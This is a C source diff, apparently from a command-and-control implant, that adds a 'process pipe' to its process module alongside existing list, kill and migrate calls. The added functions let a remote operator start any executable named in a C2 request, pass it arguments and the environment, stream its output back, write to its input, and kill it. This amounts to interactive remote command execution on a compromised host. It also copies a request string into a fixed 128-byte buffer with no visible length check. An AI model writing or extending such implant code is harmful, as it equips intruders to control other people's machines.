@@ -33,6 +33,7 @@
 #include <child.h>
 #include <tlv.h>
 #include <migrate.h>
+#include <pipe.h>
 
 #define PROCESS_BASE 2
 
@@ -53,8 +54,18 @@
                        PROCESS_BASE, \
                        API_CALL + 3)
 
+#define PROCESS_PIPE \
+        TLV_PIPE_CUSTOM(PIPE_STATIC, \
+                        PROCESS_BASE, \
+                        PIPE_TYPE)
+
 #define TLV_TYPE_PID_STATE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE)
 #define TLV_TYPE_PID_CPU   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 1)
+
+#define TLV_TYPE_PROCESS_ARGV TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 2)
+#define TLV_TYPE_PROCESS_ENV  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 3)
+
+extern char **environ;
 
 static tlv_pkt_t *process_list(c2_t *c2)
 {
@@ -159,12 +170,130 @@ static tlv_pkt_t *process_migrate(c2_t *c2)
     return api_craft_tlv_pkt(API_CALL_FAIL);
 }
 
+static int process_create(pipe_t *pipe, c2_t *c2)
+{
+    char path[PATH_MAX];
+    char args[128];
+
+    child_t *child;
+    child_options_t options;
+
+    options.args = NULL;
+    options.env = environ;
+    options.flags = CHILD_NO_FORK;
+
+    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, path);
+
+    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PROCESS_ARGV, args) > 0)
+    {
+        options.args = args;
+    }
+
+    child = child_create(path, NULL, &options);
+
+    if (child == NULL)
+    {
+        return -1;
+    }
+
+    child_set_links(child, NULL, NULL, NULL, child);
+    log_debug("* Child created for process (%s)\n", path);
+
+    pipe->data = child;
+    return 0;
+}
+
+static int process_tell(pipe_t *pipe)
+{
+    child_t *child;
+
+    queue_t *out_queue;
+    queue_t *err_queue;
+
+    child = pipe->data;
+
+    out_queue = child->out_queue.queue;
+    err_queue = child->err_queue.queue;
+
+    if (out_queue->bytes == 0)
+    {
+        log_debug("* Child has (%d) bytes in err\n", out_queue->bytes);
+        return err_queue->bytes;
+    }
+
+    log_debug("* Child has (%d) bytes in out\n", out_queue->bytes);
+    return out_queue->bytes;
+}
+
+static int process_read(pipe_t *pipe, void *buffer, int length)
+{
+    child_t *child;
+
+    log_debug("* Reading from child (%d bytes)\n", length);
+
+    child = pipe->data;
+    return child_read(child, buffer, length);
+}
+
+static int process_write(pipe_t *pipe, void *buffer, int length)
+{
+    child_t *child;
+
+    log_debug("* Writing to child (%d bytes)\n", length);
+
+    child = pipe->data;
+    return child_write(child, buffer, length);
+}
+
+static int process_heartbeat(pipe_t *pipe)
+{
+    child_t *child;
+
+    child = pipe->data;
+
+    if (child->status == CHILD_DEAD)
+    {
+        log_debug("* Child is DEAD\n");
+        return -1;
+    }
+
+    log_debug("* Child is ALIVE\n");
+    return 0;
+}
+
+static int process_destroy(pipe_t *pipe, c2_t *c2)
+{
+    child_t *child;
+
+    child = pipe->data;
+    log_debug("* Killing child process (PID: %d)\n", child->pid);
+
+    child_kill(child);
+    child_destroy(child);
+
+    return 0;
+}
+
 void register_process_api_calls(api_calls_t **api_calls)
 {
     api_call_register(api_calls, PROCESS_LIST, process_list);
     api_call_register(api_calls, PROCESS_KILL, process_kill);
     api_call_register(api_calls, PROCESS_GET_PID, process_get_pid);
     api_call_register(api_calls, PROCESS_MIGRATE, process_migrate);
+}
+
+void register_process_api_pipes(pipes_t **pipes)
+{
+    pipe_callbacks_t callbacks;
+
+    callbacks.create_cb = process_create;
+    callbacks.read_cb = process_read;
+    callbacks.write_cb = process_write;
+    callbacks.tell_cb = process_tell;
+    callbacks.heartbeat_cb = process_heartbeat;
+    callbacks.destroy_cb = process_destroy;
+
+    api_pipe_register(pipes, PROCESS_PIPE, callbacks);
 }
 
 #endif
